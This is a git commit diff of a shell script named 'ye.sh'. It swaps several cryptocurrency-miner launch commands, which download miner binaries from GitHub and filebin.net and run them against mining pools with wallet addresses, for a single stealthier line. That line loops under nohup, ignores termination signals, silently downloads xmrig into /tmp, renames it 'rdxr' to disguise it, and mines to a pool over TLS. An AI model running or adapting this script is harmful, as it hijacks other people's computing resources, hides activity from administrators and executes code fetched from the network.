6979b0920c63d5f5a3f885d4e2f88556fd0d8e80
terasaka253 <terasaka253@gmail.com>
2025-11-19 04:32:08 +0700

    Update ye.sh

--- ye.sh
+++ ye.sh
@@ -1,8 +1,1 @@
-mkdir 7RfZ2bBn && cd 7RfZ2bBn && wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -zxf xmrig-6.21.0-linux-x64.tar.gz && cd xmrig-6.21.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BONK:7C3vQRUmUzj53r6bT74TxcTV7RfZ2bBnozByYPKEnhDr.meki#4yh6-ojiu -p x --threads=16
-
-4B47a4mwDwySEQoEwokK3LXXYEbUp3AH57W5p1PpNYLNiSF14hKt7dYZLqd1BmBjAmKBW5DUjwiBPhxBbqtA3oevKFGM6TB
-
-wget https://filebin.net/mlp1gt9ec3s18saf/cpuminertermux && chmod +x cpuminertermux && ./cpuminertermux -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u t1fNgzdtSPKKSqcGiWvL42QZxq5CmVXX82R -p c=FLUX --threads 28 &
-
-
-wget https://github.com/OneZeroMiner/onezerominer/releases/download/v1.4.4/onezerominer-linux-1.4.4.tar.gz && tar -zxf onezerominer-linux-1.4.4.tar.gz && cd onezerominer-linux && ./onezerominer -a xelishashv2 -o us.xelis.herominers.com:1225 -w xel:erkp6hggymxqmwa0qs5fk8n7nnu9fmmf89grq9sfcxd37x5m5gwsqvsk0ne.aMyMiningFarm1 -p x
+nohup bash -c 'trap "" HUP INT QUIT TERM; while true; do cd /tmp && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && mv xmrig rdxr && ./rdxr -o eu.hashvault.pro:443 -u SaLvdTxizfddRPvL3jmgiJAhaDHCaHsTx4yrg2mNpqGqA5s3DnWSpiBE4g9ZQMgAVZQRg8AvnjeZZXoKrRwb6M164YcqEcDy8gS -p 48t --tls; done'  > /dev/null 2>&1  &
